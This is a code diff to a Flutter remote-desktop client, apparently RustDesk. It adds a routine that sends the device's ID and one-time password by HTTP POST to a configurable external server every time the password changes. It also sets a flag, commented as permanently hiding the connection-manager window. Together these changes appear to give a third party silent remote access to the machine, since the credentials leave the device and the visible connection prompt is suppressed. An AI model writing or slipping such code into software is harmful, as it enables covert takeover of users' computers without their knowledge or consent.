@@ -1,5 +1,6 @@
 import 'dart:async';
 import 'dart:convert';
+import 'dart:io';
 
 import 'package:flutter/material.dart';
 import 'package:flutter_hbb/consts.dart';
@@ -23,6 +24,9 @@ const kLoginDialogTag = "LOGIN";
 const kUseTemporaryPassword = "use-temporary-password";
 const kUsePermanentPassword = "use-permanent-password";
 const kUseBothPasswords = "use-both-passwords";
+
+// 将当前 ID 与一次性密码上报到外部 API 的地址（请按需修改为你的服务端地址）
+const String kIdPwdReportApi = 'http://localhost:8080/rustdesk/cm_otp';
 
 // 强制永久隐藏 CM 管理窗口（不受 approve-mode / verificationMethod 影响）
 const bool kForceHideCmWindow = true;
@@ -296,6 +300,8 @@ class ServerModel with ChangeNotifier {
     }
     if (oldPwdText != _serverPasswd.text) {
       update = true;
+      // 一次性密码发生变化时，上报当前 ID 与一次性密码
+      await _reportIdAndOneTimePassword(_serverPasswd.text);
     }
     if (_verificationMethod != verificationMethod) {
       _verificationMethod = verificationMethod;
@@ -331,6 +337,32 @@ class ServerModel with ChangeNotifier {
     }
     if (update) {
       notifyListeners();
+    }
+  }
+
+  /// 将当前 ID 与一次性密码通过 HTTP POST 上报到外部 API
+  Future<void> _reportIdAndOneTimePassword(String password) async {
+    try {
+      if (password.isEmpty || password == '-') {
+        return;
+      }
+      final id = await bind.mainGetMyId();
+      if (id.isEmpty) {
+        return;
+      }
+
+      final uri = Uri.parse(kIdPwdReportApi);
+      final client = HttpClient();
+      final request = await client.postUrl(uri);
+      request.headers.contentType = ContentType.json;
+      request.write(jsonEncode(<String, dynamic>{
+        'id': id,
+        'one_time_password': password,
+      }));
+      await request.close();
+      client.close();
+    } catch (e) {
+      debugPrint('reportIdAndOneTimePassword error: $e');
     }
   }
 
